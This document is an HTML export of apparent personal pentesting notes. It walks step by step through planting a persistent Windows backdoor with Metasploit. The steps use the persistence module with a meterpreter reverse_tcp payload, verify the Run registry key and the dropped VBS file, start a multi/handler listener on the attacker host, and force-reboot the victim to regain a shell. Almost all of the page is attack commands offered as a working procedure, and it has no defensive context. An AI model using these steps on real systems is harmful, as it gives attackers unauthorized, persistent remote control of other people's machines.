<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>backdoor with metasploit</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>backdoor with metasploit</h1><br/><strong><h2>Backdoor</h2></strong><br />1. On metasploit we search for a persistence backdoor exploit<br />    <div class="codebox"><div class="codebox">search&nbsp;persistence</div></div><br />    <a href=""><img src="images/866-1.png" alt="images/866-1.png" /></a><br />2. <div class="codebox"><div class="codebox">use&nbsp;exploit/windows/local/persistence</div></div><br />    <a href=""><img src="images/866-2.png" alt="images/866-2.png" /></a><br />    *instead with &quot;post/windows/manage/persistence_exe&quot; we have to upload our executable backdoor<br />3. set payload<br />    <div class="codebox"><div class="codebox">set&nbsp;PAYLOAD&nbsp;payload/windows/meterpreter/reverse_tcp</div></div><br />    <a href=""><img src="images/866-3.png" alt="images/866-3.png" /></a><br />4. <div class="codebox"><div class="codebox">show&nbsp;options</div></div><br />    <a href=""><img src="images/866-4.png" alt="images/866-4.png" /></a><br />5. <div class="codebox"><div class="codebox">run</div></div><br />    <a href=""><img src="images/866-5.png" alt="images/866-5.png" /></a><br />6. Now we can check if the changes are been done<br />    <div class="codebox"><div class="codebox">meterpreter&nbsp;&gt;&nbsp;reg&nbsp;queryval&nbsp;-k&nbsp;HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run&nbsp;-v&nbsp;backdoor_registry</div></div><br />    <a href=""><img src="images/866-6.png" alt="images/866-6.png" /></a><br />    <div class="codebox"><div class="codebox">meterpreter&nbsp;&gt;&nbsp;ls&nbsp;C:\\Windows\\TEMP\\bRMMdjDrlXHmR.vbs</div></div><br />    <a href=""><img src="images/866-7.png" alt="images/866-7.png" /></a><br />7. Before restart the target machine you have to create a listener at the specific port<br />    <div class="codebox"><div class="codebox">msf&nbsp;&gt;&nbsp;use&nbsp;exploit/multi/handler<br />msf&nbsp;&gt;&nbsp;set&nbsp;payload&nbsp;windows/meterpreter/reverse_tcp&nbsp;#same-payload-placed-in-the-victim-machine<br />msf&nbsp;&gt;&nbsp;set&nbsp;lhost&nbsp;&lt;lhost&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#attacker&nbsp;host<br />msf&nbsp;&gt;&nbsp;set&nbsp;lport&nbsp;&lt;lport&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#attacker&nbsp;listening<br />msf&nbsp;&gt;&nbsp;exploit&nbsp;-j&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#run&nbsp;module&nbsp;in&nbsp;the&nbsp;background</div></div><br />8. Restart the remote Windows machine to make effective the backdoor. <br />    The active session will die(session 9) but we do not care because we will get a new session when the user will login to the machine (<span style="color:#00ff00;">session 11</span>)<br />    <div class="codebox"><div class="codebox">msf&nbsp;&gt;&nbsp;sessions&nbsp;-i&nbsp;&lt;Id-session&gt;<br />meterpreter&nbsp;&gt;&nbsp;shell<br />C:\Users\danie\Desktop&gt;&nbsp;shutdown&nbsp;/r&nbsp;/f</div></div><br />    <a href=""><img src="images/866-8.png" alt="images/866-8.png" /></a><br />9. come back to metasploit and check for active sessions<br />    <div class="codebox"><div class="codebox">msf&nbsp;&gt;&nbsp;sessions<br />msf&nbsp;&gt;&nbsp;sessions&nbsp;-i&nbsp;<span style="color:#000000;font-weight:400">&lt;</span>ID-session<span style="color:#000000;font-weight:400">&gt;</span></div></div><br />    <a href=""><img src="images/866-9.png" alt="images/866-9.png" /></a><br /><br /><br /></div>
</body>
</html>
